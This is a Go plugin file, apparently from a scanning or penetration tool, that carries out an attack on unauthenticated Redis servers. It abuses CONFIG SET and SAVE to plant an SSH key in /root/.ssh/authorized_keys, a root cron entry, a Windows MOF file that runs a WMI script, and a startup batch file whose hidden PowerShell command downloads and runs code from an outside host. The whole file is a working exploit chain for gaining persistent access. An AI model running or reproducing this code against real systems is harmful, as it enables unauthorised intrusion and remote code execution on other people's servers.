package plugins

import (
	"context"
	"fmt"
	"github.com/go-redis/redis"
)

func redisAttack(ctx context.Context, s *Service, client *redis.Client) {
	attack := "LinuxSsh"
	defer func() {
		if attack != "" {
			s.parent.Result.Output.Set("helper", "Redis attack successfully:"+attack)
		}
	}()
	err := make([]string, 0)
	err1 := redisTryLinuxSsh(ctx, client);
	if err1 == nil {
		return
	}
	err = append(err, err1.Error())

	attack = "LinuxCron"
	err1 = redisTryLinuxCron(ctx, client)
	if err1 == nil {
		return
	}
	err = append(err, err1.Error())

	attack = "WindowsCron+WindowStartup" //<win2003
	err1 = redisTryWindowsCron(ctx, client)
	if err1 != nil {
		err = append(err, err1.Error())
	}
	err1 = redisTryWindowsStartup(ctx, client)
	if err1 == nil {
		return
	}

	attack = ""
	s.parent.Result.Output.Set("helper", fmt.Sprintf("Redis attack failed: %v", err))
	return
}

func redisTryWindowsCron(ctx context.Context, client *redis.Client) error {
	if _, err := client.Set(ctx,
		"redisTryWindowsCron", `#pragma namespace("\\.\root\subscription") instance of __EventFilter as $EventFilter { EventNamespace = "Root\Cimv2"; Name = "filtP2"; Query = "Select * From __InstanceModificationEvent " "Where TargetInstance Isa "Win32_LocalTime" " "And TargetInstance.Second = 5"; QueryLanguage = "WQL"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = "consPCSV2"; ScriptingEngine = "JScript"; ScriptText = "var WSH = new ActiveXObject("WScript.Shell")\nWSH.run("ping qvn0kc.ceye.io ")"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; };`, 0).Result(); err != nil {
		return err
	}
	if _, err := client.ConfigSet(ctx, "dir", "C:/windows/system32/wbem/mof/").Result(); err != nil {
		return err
	}
	if _, err := client.ConfigSet(ctx, "dbfilename", "pingMe.mof").Result(); err != nil {
		return err
	}
	if _, err := client.Save(ctx).Result(); err != nil {
		return err
	}
	return nil
}

func redisTryWindowsStartup(ctx context.Context, client *redis.Client) error {
	if _, err := client.Set(ctx,
		"redisTryWindowsStartup", `\r\n\r\npowershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://qvn0kc.ceye.io'))"\r\n\r\n`, 0).Result(); err != nil {
		return err
	}
	if _, err := client.ConfigSet(ctx, "dir", "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/").Result(); err != nil {
		return err
	}
	if _, err := client.ConfigSet(ctx, "dbfilename", "check.bat").Result(); err != nil {
		return err
	}
	if _, err := client.Save(ctx).Result(); err != nil {
		return err
	}
	return nil
}

func redisTryLinuxCron(ctx context.Context, client *redis.Client) error {
	if _, err := client.Set(ctx,
		"redisTryLinuxCron", "\n\n*/1 * * * * ping qvn0kc.ceye.io -c 2 -w 2 0>&1\n\n", 0).Result(); err != nil {
		return err
	}
	if _, err := client.ConfigSet(ctx, "dir", "/var/spool/cron").Result(); err != nil {
		return err
	}
	if _, err := client.ConfigSet(ctx, "dbfilename", "root").Result(); err != nil {
		return err
	}
	if _, err := client.Save(ctx).Result(); err != nil {
		return err
	}
	return nil
}

func redisTryLinuxSsh(ctx context.Context, client *redis.Client) error {
	if _, err := client.Set(ctx,
		"redisTryLinuxSsh", Config.SshPubKey, 0).Result(); err != nil {
		return err
	}
	if _, err := client.ConfigSet(ctx, "dir", "/root/.ssh").Result(); err != nil {
		return err
	}
	if _, err := client.ConfigSet(ctx, "dbfilename", "authorized_keys").Result(); err != nil {
		return err
	}
	if _, err := client.Save(ctx).Result(); err != nil {
		return err
	}
	return nil
}
